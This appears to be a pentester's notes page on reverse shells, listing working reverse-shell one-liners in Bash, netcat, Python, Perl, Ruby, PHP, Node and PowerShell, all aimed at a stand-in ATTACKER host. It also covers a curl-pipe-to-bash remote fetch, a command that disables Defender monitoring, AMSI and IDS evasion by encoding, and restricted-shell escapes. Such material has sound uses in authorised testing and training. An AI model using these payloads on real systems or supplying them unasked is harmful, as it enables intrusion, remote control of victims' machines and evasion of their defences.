+++
title = 'Shells and Payloads'
date = 2026-10-30
type = 'notes'
weight = 10
toc = true
tags = ['utilities', 'payloads', 'shells']
+++

A shell is only useful if it is **stable, interactive, and reachable**. A raw `nc` catch that dies on Ctrl+C, cannot run `sudo` because there is no TTY, or never arrives because port 4444 is filtered is not a foothold — it is a time sink. This file covers payloads, but it is organised around **the three failure modes** you will actually hit: the shell does not connect, the shell connects but is unusable, and the shell connects but dies.

---

## 1. Useful Resources

- [RevShells.com](https://www.revshells.com/) — generator for every language
- [HackTricks — Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)
- [PentestMonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [HackTricks — Full TTYs](https://hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html) — the definitive TTY-upgrade reference
- [ExploitNotes — Reverse Shell](https://exploit-notes.hdks.org/exploit/shell/reverse-shell-cheat-sheet/)

---

## 2. Troubleshooting — Before You Blame the Payload

Most failed shells are not payload problems. They are **egress, listener, or syntax** problems. Run this checklist in order before changing payloads.

### 2.1 Is the listener actually listening?

```bash
# On the attacker
ss -tulpn | grep <PORT>
# or
nc -lvnp <PORT>
```

A listener that exits immediately, or one bound to `127.0.0.1` instead of `0.0.0.0`, will never receive a remote connection.

### 2.2 Is egress filtered?

A connect-back that **silently fails** is usually a **filtered egress port**, not a broken payload.

```bash
# From the target, test reachability before committing to a shell channel
curl -m 5 http://ATTACKER_IP:<PORT>
nc -zv -w 5 ATTACKER_IP <PORT>
```

Common C2 ports (`4444`, `1337`) are frequently blocked while **`443`, `80`, `53`, `8000`** pass. Use a common port for the listener:

```bash
nc -lvnp 443          # looks like HTTPS
nc -lvnp 80           # looks like HTTP
```

> **Rule:** Do not grind ports. If `443` and `80` both fail, the problem is not the port — it is the IP, the listener, or a host firewall you have not identified.

### 2.3 Is the payload syntactically correct?

Copy-paste is the single largest source of broken payloads:

- **Wrong IP or port** — double-check.
- **Unmatched quotes** — a `"` or `'` in the payload interacts with the injection context (a web parameter, a `system()` call, a SQL query). If the RCE context wraps your input in double quotes, a `"` in the payload closes the quote and the rest becomes shell syntax — which can be **useful** (`";id;#`) but also breaks the payload if unintended.
- **Special characters** — `&`, `|`, `;`, `>`, `<`, `(`, `)` are interpreted by the **injection context** before your shell sees them. Use the alternative payload for that context, or base64-encode the command.

```bash
# When the injection context eats special characters, encode the whole command
echo -n 'bash -i >& /dev/tcp/ATTACKER/443 0>&1' | base64 -w0
# Target:
echo BASE64 | base64 -d | bash
```

### 2.4 Does the payload match the target?

| Check | Command |
|---|---|
| Architecture | `uname -m` / `echo %PROCESSOR_ARCHITECTURE%` |
| Interpreter present | `which python python3 perl ruby php node nc ncat socat` |
| `bash` vs `sh` | `ls -l /bin/sh` — dash does **not** support `/dev/tcp` |
| Netcat variant | `nc -h` — OpenBSD `nc` has **no `-e`** |
| Target OS | `uname -a` / `systeminfo` |

### 2.5 Does the payload have permission to execute?

If you uploaded a binary, it needs `chmod +x`. A subtle trap: if you `chmod +x` **through a URL** (e.g. a webshell parameter), the `+` is URL-decoded as a space, producing `chmod x 777`. Use **numeric** permissions instead: `chmod 777 /tmp/payload`.

### 2.6 Is the injection point actually executing?

Before sending a shell, send a **proof-of-execution**:

```bash
# Linux
id; hostname; curl -m 3 http://ATTACKER/proof
# Windows
whoami & hostname
```

If the proof does not arrive, the problem is the injection, not the shell.

---

## 3. TTY Upgrade — Fixing the “Connected but Unusable” Shell

A raw `nc` shell is just stdin/stdout over TCP. It has **no terminal emulation, no signal handling, no job control, and no tab completion** — and `sudo` will refuse to run without a TTY.

### 3.1 The standard Python PTY upgrade (works ~90% of the time)

**Step 1 — spawn a PTY on the target:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# If Python 3 is absent:
python -c 'import pty; pty.spawn("/bin/bash")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
```

**Step 2 — background the shell:**

```
Ctrl + Z
```

**Step 3 — on your local terminal, disable local echo and pass control:**

```bash
stty raw -echo; fg
```

> The `fg` re-opens the shell. You may see no output until you press **Enter** twice.

**Step 4 — set the terminal type and shell:**

```bash
export TERM=xterm-256color
export SHELL=/bin/bash
```

**Step 5 — match the terminal size.** Run this **in a new local terminal**:

```bash
stty size
# e.g. 50 220
```

Then in the reverse shell:

```bash
stty rows 50 columns 220
```

**Step 6 — reset the terminal:**

```bash
reset
```

You now have **tab completion, arrow-key history, Ctrl+C that interrupts the remote process, `vim`, `less`, and `sudo`**.

### 3.2 `script` fallback (no Python)

```bash
script /dev/null -qc /bin/bash
# then the same Ctrl+Z → stty raw -echo; fg → export TERM / stty rows/cols → reset
```

`/dev/null` prevents the session from being recorded to a `typescript` file.

### 3.3 Socat — the cleanest full TTY

If you can transfer the `socat` binary, this produces a **proper PTY on both ends** — no `stty` dance required.

**Attacker — listener:**

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Target — connect back:**

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

This gives you a fully interactive shell with job control, signals, and correct terminal sizing from the first byte.

### 3.4 If the shell “dies” or prints `no job control`

- **`bash: no job control in this shell`** — the shell has no controlling terminal. Set `TERM` and, if needed, re-run `setsid`:

  ```bash
  export TERM=xterm
  # or for a fresh session:
  setsid bash
  ```

  The message is normal for a shell without a controlling TTY and is fixed by the PTY upgrade above.

- **Ctrl+C kills the connection** — you are in **cooked** mode, not raw. Do the `stty raw -echo; fg` step.

- **Terminal is garbled after exit** — restore your local terminal:

  ```bash
  stty sane
  reset
  ```

- **Commands produce no output** — the shell may be in a bad state; press **Enter**, then `reset`.

---

## 4. Payloads — Linux

### 4.1 Bash

```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1
bash -c "bash -i >& /dev/tcp/ATTACKER/443 0>&1"
0<&196;exec 196<>/dev/tcp/ATTACKER/443; sh <&196 >&196 2>&196
```

> **Edge case:** `/dev/tcp` is a **bash feature**, not a kernel device. It does not exist in `sh`, `dash`, `zsh` (unless enabled), or `busybox` — which is why the same payload fails in a minimal container. If `/dev/tcp` fails, use Python, Perl, `nc`, or the `mkfifo` approach.

### 4.2 Netcat

```bash
# Only netcat-traditional / ncat support -e; OpenBSD netcat (the default on many distributions) does NOT.
nc ATTACKER 443 -e /bin/bash

# Portable named-pipe shell (works with any netcat):
rm -f /tmp/p; mknod /tmp/p p
/bin/sh 0</tmp/p | nc ATTACKER 443 1>/tmp/p

# ncat:
ncat -e /bin/bash ATTACKER 443
```

> **Edge case:** if `nc -h` does not list `-e`, use the `mkfifo` variant. This is the most common reason a “netcat reverse shell” fails on the attacker host against a target that also runs OpenBSD `nc`.

### 4.3 Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PTY spawn (not a reverse shell — a stabiliser):**

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### 4.4 Perl / Ruby / PHP / Node

```perl
perl -e 'use Socket;$i="ATTACKER";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'");?>
```

```javascript
require('child_process').exec('bash -i >& /dev/tcp/ATTACKER/443 0>&1')
```

### 4.5 Spawning a shell from a restrictive context

These are useful when you have **command execution** but no reverse channel, or when a restricted shell blocks `/bin/sh`:

```bash
awk 'BEGIN {system("/bin/sh")}'
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
```

---

## 5. Payloads — Windows

### 5.1 PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> **Quoting edge case:** this payload contains single quotes, double quotes, `$`, and `>`. If it is injected into a context that wraps input in double quotes, it will break. **Use `-EncodedCommand`** — Base64-encode the whole script and pass it with `-e` / `-EncodedCommand`, which removes quoting problems entirely:

```powershell
powershell -nop -e <BASE64_OF_SCRIPT>
```

> **AMSI edge case:** modern Windows scans PowerShell strings before execution. `-EncodedCommand` bypasses **simple** AMSI string matching but is caught by EDR that decodes and inspects the command. For hardened targets, use a `.NET` reflection or a signed-binary proxy instead.

### 5.2 Defender real-time monitoring

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Requires **elevated** PowerShell and **Tamper Protection off**. On a non-elevated shell this silently fails.

---

## 6. Bind Shells vs Reverse Shells — Choosing Correctly

| Factor | Reverse shell | Bind shell |
|---|---|---|
| **Egress firewall** | Works if outbound is allowed | Blocked by egress filtering |
| **Ingress firewall** | Not blocked | Requires inbound access to the victim |
| **NAT** | Works (victim connects out) | Fails (cannot reach victim behind NAT) |
| **Detection** | Outbound connection — less suspicious | Listening port — easily detected |

**When reverse shells are blocked**, a **forward shell** over an existing channel (e.g. a webshell) can provide pseudo-terminal interaction without a new inbound connection.

---

## 7. When `/dev/tcp` or `nc -e` Is Unavailable — Fallback Chain

1. **Bash `/dev/tcp`** — works on bash, fails on `sh`/`dash`/`busybox`.
2. **Python** — almost always present; `socket` module is in the standard library.
3. **Perl** — present on most base installs.
4. **`mkfifo` + `nc`** — works with **any** netcat, no `-e` required.
5. **`socat`** — if present, the cleanest option.
6. **`curl` / `wget`** — pipe a hosted script: `curl -s http://ATTACKER/shell.sh | bash`.
7. **Base64 over an existing channel** — when nothing else is available.

---

## 8. Restricted Shell Escape (`rbash`)

If your shell is `rbash`, you cannot `cd`, set `PATH`, use `/`, or redirect output. Escapes:

- **`history -w` / `history -a`** — if `$HOME` is writable, these built-ins can overwrite `.profile`, which is sourced on the next login and can reset `PATH`.
- **`vi` / `vim`** — `:!bash` or `:set shell=/bin/bash` → `:shell`.
- **`awk`** — `awk 'BEGIN {system("/bin/sh")}'`.
- **`find`** — `find . -exec /bin/sh \; -quit`.
- **`python` / `perl`** — `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

> **Edge case:** `rbash` blocks output redirection, so `echo > file` fails — but `history -w` and editor `:w` commands write files through the built-in, not the shell, which is why they bypass the restriction.

---

## 9. Shell Detection — Why Your Shell Might Be Killed

- **Egress filtering on common C2 ports** — `4444` and `1337` are signatured; `443` and `80` are not.
- **Reverse-shell signatures** — IDS/EDR detects `bash -i >& /dev/tcp`, `nc -e`, and the PowerShell `TCPClient` string. Obfuscate with base64, `$'...'` octal encoding, or a compiled payload.
- **`sudo` requires a TTY** — a raw `nc` shell will fail `sudo` even with the correct password until the PTY upgrade is done.
- **`NoNewPrivileges` / seccomp** — a restricted service context blocks `setuid` and some syscalls regardless of the shell payload.

---

## 10. Quick Reference — The Shell Workflow

```bash
# 1. Listener on a common port
nc -lvnp 443

# 2. Proof of execution
id; hostname

# 3. Raw shell (choose one that matches the target)
bash -i >& /dev/tcp/ATTACKER/443 0>&1

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

rm -f /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc ATTACKER 443 1>/tmp/p

# 4. TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color; export SHELL=/bin/bash
stty rows 50 columns 220
reset

# 5. If the shell dies on Ctrl+C, you skipped step 4.
```

---

## 11. Field Notes

- **A silent connect-back is a firewall, not a payload bug.** Test `curl`/`nc -z` to the attacker port from the target before spending time on syntax.
- **`nc -e` is not universal.** OpenBSD `nc` (the default on many distributions) has no `-e`; use `mkfifo` or `ncat`.
- **`/dev/tcp` is bash-only.** In a minimal container, it will fail silently or with “No such file or directory”.
- **The PTY upgrade is not optional.** `sudo`, `su`, `vim`, `less`, and password prompts all require a TTY.
- **PowerShell quoting is the #1 Windows payload failure.** Use `-EncodedCommand` to eliminate it.
- **Restore your local terminal after a shell dies:** `stty sane; reset`.

---
